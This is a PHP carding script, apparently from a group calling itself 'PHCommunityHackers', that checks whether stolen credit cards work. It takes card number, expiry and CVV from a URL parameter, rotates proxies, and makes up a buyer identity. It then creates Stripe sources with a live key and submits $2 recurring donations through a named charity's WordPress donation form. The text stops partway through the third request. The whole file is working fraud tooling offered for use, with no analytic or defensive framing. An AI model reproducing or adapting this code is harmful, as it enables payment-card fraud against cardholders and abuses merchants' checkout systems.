<?php
////3 REQ API
////////////////PHCommunityHackers
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();
$ip = multiexplode(array(":", "|", ""), $poxySocks4)[0];
echo '<span class="badge badge-light">𝐈𝐏 𝐔𝐒𝐄𝐃: '.$ip.'</span>';
////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];


////////////////////////////===[1ST CURL]
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'pragma: no-cache',
'referer: https://js.stripe.com/v3/controller-7214ce75b9fcb70166e1f4c474a0cd6e.html',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36'
     ));
     curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[email]='.$email.'&owner[address][postal_code]='.$postcode.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=0cd32829-328a-44dd-820a-41d1dc5590437d2501&muid=727296d3-5637-4046-8ac2-ce6d6056506c5fb2b8&sid=1d48ea95-063f-4b68-9c5e-4b47aa830ae1c13ca1&pasted_fields=number&payment_user_agent=stripe.js%2Ffe113923%3B+stripe-js-v3%2Ffe113923&time_on_page=62142&referrer=https%3A%2F%2Fsummerfestivalcamp.com%2Fdonate%2F&key=pk_live_mJhbUqz7lklVPnEW2sWlvTZP00rWuWXW5j');
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$resulta = curl_exec($ch);
$unggoy = json_decode($resulta, true);
$token1 = $unggoy['id'];

//////////////////////////===[2ND CURL]

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://summerfestivalcamp.com/wp-json/wpsp/v2/customer');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array( 
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://summerfestivalcamp.com',
'referer: https://summerfestivalcamp.com/donate/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36'
     ));
     curl_setopt($ch, CURLOPT_POSTFIELDS, 'form_values%5Bsimpay_subscription_custom_amount%5D=2.00&form_values%5Bsimpay_has_custom_plan%5D=true&form_values%5Bsimpay_email%5D=setsunadepota%40gmail.com&form_values%5Bsimpay_form_id%5D=699&form_values%5Bsimpay_amount%5D=200&form_values%5B_wpnonce%5D=b1e7735915&form_values%5B_wp_http_referer%5D=%2Fdonate%2F&form_data%5BformId%5D=699&form_data%5BformInstance%5D=1&form_data%5Bquantity%5D=1&form_data%5BisValid%5D=true&form_data%5BstripeParams%5D%5Bkey%5D=pk_live_mJhbUqz7lklVPnEW2sWlvTZP00rWuWXW5j&form_data%5BstripeParams%5D%5Bsuccess_url%5D=https%3A%2F%2Fsummerfestivalcamp.com%2Fpayment-confirmation%2F%3Fform_id%3D699&form_data%5BstripeParams%5D%5Berror_url%5D=https%3A%2F%2Fsummerfestivalcamp.com%2Fpayment-failed%2F%3Fform_id%3D699&form_data%5BstripeParams%5D%5Bname%5D=Summer+Festival+Camp&form_data%5BstripeParams%5D%5Blocale%5D=auto&form_data%5BstripeParams%5D%5Bcountry%5D=US&form_data%5BstripeParams%5D%5Bcurrency%5D=USD&form_data%5BstripeParams%5D%5Bdescription%5D=Monthly+Donation&form_data%5BstripeParams%5D%5BelementsLocale%5D=auto&form_data%5BstripeParams%5D%5BbillingAddress%5D=true&form_data%5BstripeParams%5D%5Bamount%5D=200&form_data%5BisSubscription%5D=true&form_data%5BisTrial%5D=false&form_data%5BhasCustomerFields%5D=true&form_data%5BhasPaymentRequestButton%5D=false&form_data%5Bamount%5D=0&form_data%5BsetupFee%5D=0&form_data%5BminAmount%5D=1&form_data%5BtotalAmount%5D=&form_data%5BsubMinAmount%5D=1&form_data%5BplanIntervalCount%5D=1&form_data%5BtaxPercent%5D=0&form_data%5BfeePercent%5D=0&form_data%5BfeeAmount%5D=0&form_data%5BminCustomAmountError%5D=The+minimum+amount+allowed+is+%26%2336%3B1.00&form_data%5BsubMinCustomAmountError%5D=The+minimum+amount+allowed+is+%26%2336%3B1.00&form_data%5Bi18n%5D%5Bideal%5D%5Bempty%5D=Please+select+a+bank&form_data%5BpaymentButtonText%5D=Pay+with+Card&form_data%5BpaymentButtonLoadingText%5D=Please+Wait...&form_data%5BsubscriptionType%5D=single&form_data%5BplanInterval%5D=month&form_data%5BcheckoutButtonText%5D=Pay+%7B%7Bamount%7D%7D&form_data%5BcheckoutButtonLoadingText%5D=Please+Wait...&form_data%5BdateFormat%5D=mm%2Fdd%2Fyy&form_data%5BformDisplayType%5D=overlay&form_data%5BpaymentMethods%5D%5B0%5D%5Bid%5D=card&form_data%5BpaymentMethods%5D%5B0%5D%5Bname%5D=Card&form_data%5BpaymentMethods%5D%5B0%5D%5Bflow%5D=none&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=aed&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=afn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=all&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=amd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ang&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=aoa&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ars&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=aud&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=awg&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=azn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bam&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bbd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bdt&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bgn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bhd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bif&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bmd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bnd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bob&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=brl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bsd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=btc&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=btn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bwp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=byr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bzd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cad&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cdf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=chf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=clp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cny&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cop&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=crc&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cuc&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cup&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cve&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=czk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=djf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=dkk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=dop&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=dzd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=egp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ern&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=etb&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=eur&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=fjd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=fkp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gbp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gel&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ggp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ghs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gip&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gmd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gnf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gtq&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gyd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=hkd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=hnl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=hrk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=htg&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=huf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=idr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ils&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=imp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=inr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=iqd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=irr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=isk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=jep&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=jmd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=jod&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=jpy&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kes&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kgs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=khr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kmf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kpw&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=krw&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kwd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kyd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kzt&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lak&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lbp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lkr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lrd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lsl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lyd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mad&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mdl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mga&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mkd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mmk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mnt&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mop&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mro&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mur&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mvr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mwk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mxn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=myr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mzn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=nad&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ngn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=nio&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=nok&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=npr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=nzd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=omr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pab&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pen&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pgk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=php&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pkr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pln&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=prb&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pyg&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=qar&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=rmb&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ron&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=rsd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=rub&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=rwf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sar&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sbd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=scr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sdg&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sek&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sgd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=shp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sll&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sos&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=srd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ssp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=std&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=syp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=szl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=thb&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=tjs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=tmt&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=tnd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=top&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=try&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ttd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=twd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=tzs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=uah&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ugx&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=usd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=uyu&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=uzs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=vef&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=vnd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=vuv&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=wst&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=xaf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=xcd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=xof&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=xpf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=yer&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=zar&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=zmw&form_data%5BpaymentMethods%5D%5B0%5D%5Brecurring%5D=true&form_data%5BpaymentMethods%5D%5B0%5D%5Bstripe_checkout%5D=true&form_data%5BcustomAmount%5D=2&form_data%5BplanAmount%5D=2&form_data%5BcustomPlanAmount%5D=2&form_data%5BfinalAmount%5D=2.00&form_data%5BcouponCode%5D=&form_data%5Bdiscount%5D=0&form_data%5BuseCustomPlan%5D=true&form_id=699&source_id='.$token1.'');
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result = curl_exec($ch);
$gorilla = json_decode($result, true);
$token2 = $gorilla['id'];

//////////////////////////===[3RD CURL]

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://summerfestivalcamp.com/wp-json/wpsp/v2/subscription');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array( 
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://summerfestivalcamp.com',
'referer: https://summerfestivalcamp.com/donate/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36'
     ));
     curl_setopt($ch, CURLOPT_POSTFIELDS, 'form_values%5Bsimpay_subscription_custom_amount%5D=2.00&form_values%5Bsimpay_has_custom_plan%5D=true&form_values%5Bsimpay_email%5D=setsunadepota%40gmail.com&form_values%5Bsimpay_form_id%5D=699&form_values%5Bsimpay_amount%5D=200&form_values%5B_wpnonce%5D=b1e7735915&form_values%5B_wp_http_referer%5D=%2Fdonate%2F&form_data%5BformId%5D=699&form_data%5BformInstance%5D=1&form_data%5Bquantity%5D=1&form_data%5BisValid%5D=true&form_data%5BstripeParams%5D%5Bkey%5D=pk_live_mJhbUqz7lklVPnEW2sWlvTZP00rWuWXW5j&form_data%5BstripeParams%5D%5Bsuccess_url%5D=https%3A%2F%2Fsummerfestivalcamp.com%2Fpayment-confirmation%2F%3Fform_id%3D699&form_data%5BstripeParams%5D%5Berror_url%5D=https%3A%2F%2Fsummerfestivalcamp.com%2Fpayment-failed%2F%3Fform_id%3D699&form_data%5BstripeParams%5D%5Bname%5D=Summer+Festival+Camp&form_data%5BstripeParams%5D%5Blocale%5D=auto&form_data%5BstripeParams%5D%5Bcountry%5D=US&form_data%5BstripeParams%5D%5Bcurrency%5D=USD&form_data%5BstripeParams%5D%5Bdescription%5D=Monthly+Donation&form_data%5BstripeParams%5D%5BelementsLocale%5D=auto&form_data%5BstripeParams%5D%5BbillingAddress%5D=true&form_data%5BstripeParams%5D%5Bamount%5D=200&form_data%5BisSubscription%5D=true&form_data%5BisTrial%5D=false&form_data%5BhasCustomerFields%5D=true&form_data%5BhasPaymentRequestButton%5D=false&form_data%5Bamount%5D=0&form_data%5BsetupFee%5D=0&form_data%5BminAmount%5D=1&form_data%5BtotalAmount%5D=&form_data%5BsubMinAmount%5D=1&form_data%5BplanIntervalCount%5D=1&form_data%5BtaxPercent%5D=0&form_data%5BfeePercent%5D=0&form_data%5BfeeAmount%5D=0&form_data%5BminCustomAmountError%5D=The+minimum+amount+allowed+is+%26%2336%3B1.00&form_data%5BsubMinCustomAmountError%5D=The+minimum+amount+allowed+is+%26%2336%3B1.00&form_data%5Bi18n%5D%5Bideal%5D%5Bempty%5D=Please+select+a+bank&form_data%5BpaymentButtonText%5D=Pay+with+Card&form_data%5BpaymentButtonLoadingText%5D=Please+Wait...&form_data%5BsubscriptionType%5D=single&form_data%5BplanInterval%5D=month&form_data%5BcheckoutButtonText%5D=Pay+%7B%7Bamount%7D%7D&form_data%5BcheckoutButtonLoadingText%5D=Please+Wait...&form_data%5BdateFormat%5D=mm%2Fdd%2Fyy&form_data%5BformDisplayType%5D=overlay&form_data%5BpaymentMethods%5D%5B0%5D%5Bid%5D=card&form_data%5BpaymentMethods%5D%5B0%5D%5Bname%5D=Card&form_data%5BpaymentMethods%5D%5B0%5D%5Bflow%5D=none&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=aed&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=afn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=all&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=amd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ang&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=aoa&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ars&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=aud&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=awg&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=azn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bam&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bbd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bdt&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bgn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bhd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bif&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bmd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bnd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bob&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=brl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bsd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=btc&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=btn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bwp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=byr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bzd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cad&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cdf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=chf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=clp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cny&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cop&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=crc&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cuc&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cup&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cve&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D